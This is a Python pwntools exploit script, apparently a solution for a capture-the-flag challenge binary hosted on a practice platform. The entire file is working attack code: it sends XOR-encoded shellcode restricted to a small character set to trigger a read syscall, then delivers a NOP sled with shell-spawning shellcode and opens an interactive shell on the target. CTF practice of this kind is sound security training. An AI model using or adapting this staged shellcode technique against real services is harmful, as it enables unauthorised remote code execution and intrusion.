# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
vuln: shellcode with chars "15aABCDEFGHIJKLMNOPQRSUVWXYZ"
exp:
1.construct syscall read shellcode
2.bypass check function and execute shellcode get shell
'''
from pwn import *


# define the context
binary_name = './pwn_1'
libc_name = '' if args.REMOTE \
        else ''
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
if binary_name:
    context.binary = elf 
    context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 26454)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        b main
    """, aslr=False)
else:
    io = process(binary_name)


shellcode = """
xor eax,0x35355756
xor dword ptr[rdx+0x50],eax
pop rax
xor eax,0x35354848
xor dword ptr[rdx+0x50],eax
pop rax
xor eax,0x3535444e
xor dword ptr[rdx+0x52],eax
"""

# pause()
shellcode = (asm(shellcode).ljust(0x50 - 2, b'\x58') + b'\x52\x50' + b'\x41' * 4).ljust(512, b'\x58')
print(shellcode, len(shellcode))
sn(shellcode)

sleep(0.1)
payload = b'\x90' * 0x100 + asm(shellcraft.sh())
sn(payload)

# interact with the shell
io.interactive()
